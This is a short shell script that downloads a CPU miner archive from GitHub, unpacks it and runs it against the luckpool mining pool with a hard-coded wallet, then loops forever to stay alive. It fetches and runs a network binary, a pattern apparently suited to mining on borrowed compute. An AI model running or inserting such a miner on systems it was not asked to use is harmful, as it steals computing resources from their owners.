#!/bin/sh
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RQ8nHsobx2G5cM9HtaCnZof7T7XgYjFi1c.vrs --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
